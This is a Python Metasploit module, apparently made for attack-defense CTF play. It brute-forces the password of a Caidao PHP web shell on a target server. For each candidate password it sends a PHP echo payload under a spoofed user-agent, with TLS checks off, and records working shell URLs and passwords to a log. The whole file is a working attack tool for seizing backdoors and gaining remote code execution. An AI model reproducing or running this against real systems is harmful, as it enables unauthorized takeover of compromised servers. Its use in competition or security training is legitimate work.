#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
import sys
import random
import string
import os

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True
# metasploit python module
from metasploit import module, login_scanner

metadata = {
    'name': 'AWDFlagHunter utils: Caidao bruteforce login',
    'description': '''
        This module attempts to bruteforce  caidao php backdoor.\n
        Default PASS_FILE is caidao_pass.txt in the current directory.\n
        Use creds command to see the result.\n
        The result log in MODDULE_NAME.success.log with pattern ( http://ip/caidao.php pass )\n
    ''',
    'authors': [
        'dyz'
    ],
    'date': '2020-03-22',
    'references': [
    ],
    'type': 'single_scanner',
    'options': {
        'SCHEMA': {'type': 'string', 'description': 'http or https ', 'required': True, 'default': 'http'},
        'TARGETURI': {'type': 'string', 'description': 'The base path such as  /a.php ', 'required': True, 'default': '/caidao.php'},
        'RPORT': {'type': 'port', 'description': 'rport', 'required': True, 'default': 80},
        'PASS_FILE': {'type': 'string', 'description': 'Default is caidao_pass.txt . ',
                      'required': False, 'default': None},
    },
}


def run(args):
    module.LogHandler.setup(msg_prefix='{}:{} - '.format(args['rhost'], args['RPORT']))

    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue.')
        logging.error('use (pip install requests) to install the dependency.')
        return
    ##
    logging.debug('Module path:{}'.format(__file__))
    ##
    pass_file = args["PASS_FILE"]
    if pass_file == '':
        pass_file  = os.path.join(os.path.dirname(__file__),'caidao_pass.txt')

    try:
        with open(pass_file) as f:
            passwords = f.readlines()
    except FileNotFoundError as e:
        logging.warning('Can`t  find the pass file:{}.'.format(pass_file))
        return

    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    }
    try:
        for password in passwords:
            password = password[:-1]
            mark = ''.join(random.sample(string.ascii_letters, 10))
            data = {
                password: 'echo "{}";'.format(mark)
            }
            r = requests.post('{}://{}:{}{}'.format(args['SCHEMA'], args['rhost'], args['RPORT'], args['TARGETURI']),
                              data=data, headers=headers, verify=False,timeout=4)
            if mark in r.text:
                module.log('{} - Success:{}'.format(args['rhost'], password), level='good')
                module.report_correct_password('', password)

                with open(os.path.basename(__file__)+'.success.log','a') as f :
                    f.write('{}://{}:{}{} {}\n'.format(args['SCHEMA'], args['rhost'], args['RPORT'], args['TARGETURI'],password))
                    f.flush()
                return
            else:
                logging.error('Failed: {}'.format(password))
            r.close()
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))


if __name__ == '__main__':
    module.run(metadata, run)
